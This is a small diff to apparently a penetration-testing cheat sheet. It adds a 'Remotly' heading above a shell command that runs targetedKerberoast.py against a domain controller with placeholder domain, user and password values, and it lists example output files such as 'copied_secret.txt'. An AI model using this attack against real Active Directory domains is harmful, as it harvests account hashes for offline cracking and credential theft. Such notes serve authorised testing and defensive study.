@@ -69,7 +69,7 @@ Check the output location defined in your script:
 - Example: `C:\Temp\output.txt`
     
 - Example: `C:\Temp\copied_secret.txt`
-
+## Remotly
 ### A targeted `kerberoast` attack can be performed using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).
 ``` shell
 python targetedKerberoast.py -v -d 'domain.com' -u 'user' -p 'password' --dc-ip <DomainController-IP>
